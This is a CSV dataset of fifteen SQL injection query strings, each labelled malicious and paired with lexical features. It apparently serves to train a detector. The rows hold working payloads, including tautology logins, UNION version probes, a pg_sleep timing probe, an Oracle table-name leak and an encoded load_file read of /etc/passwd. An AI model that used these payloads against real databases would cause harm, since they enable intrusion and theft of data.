,Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
0,""" or pg_sleep  (  __time__  )  --",1,33,7,0,1,10,1,0,6,0,1,2,0,0,13,0,0,0
1,create user name identified by pass123 temporary tablespace temp default tablespace users;,1,90,12,0,0,1,0,0,11,0,0,0,0,0,75,3,0,0
2," and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  table_name  )   from   (  select distinct  (  table_name  )  , rownum as limit from sys.all_tables  )   where limit  =  5   )    )    and 'i'  =  'i",1,218,35,3,0,25,0,0,35,0,2,0,0,0,120,2,0,2
3," select * from users where id  =  '1' or @ @1  =  1 union select 1,version  (    )   -- 1'",1,90,20,3,0,13,1,0,20,0,1,3,0,0,42,5,0,2
4," select * from users where id  =  1 or 1#""  (   union select 1,version  (    )   -- 1",1,85,18,0,1,10,1,0,18,0,1,3,0,0,42,4,0,2
5, select name from syscolumns where id   =     (  select id from sysobjects where name   =   tablename'  )  --,1,109,18,1,0,7,1,0,18,0,0,2,0,0,71,0,0,2
6,select * from users where id  =  1 +$+ or 1  =  1 -- 1,1,54,15,0,0,8,1,0,14,0,1,5,0,0,24,4,0,1
7,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1,93,11,0,0,22,0,0,10,0,0,0,0,0,12,33,1,0
8," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",1,90,19,3,0,14,1,0,19,0,2,4,0,0,42,5,0,2
9," select * from users where id  =  '1' or \.<\ union select 1,@@version -- 1'",1,76,15,3,0,12,1,0,15,0,1,3,0,0,42,3,0,2
10,? or 1  =  1 --,1,15,6,0,0,4,1,0,5,0,1,2,0,0,2,2,0,0
11, )   or   (  'a'  =  'a,1,23,6,3,0,6,0,0,6,0,1,0,0,0,4,0,0,0
12,admin' or 1  =  1#,1,18,5,1,0,3,0,0,4,0,1,0,0,0,7,2,0,0
13," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1,63,18,0,2,9,1,0,18,0,2,3,0,0,26,4,0,1
14,or 1  =  1 --,1,13,5,0,0,3,1,0,4,0,0,2,0,0,2,2,0,0
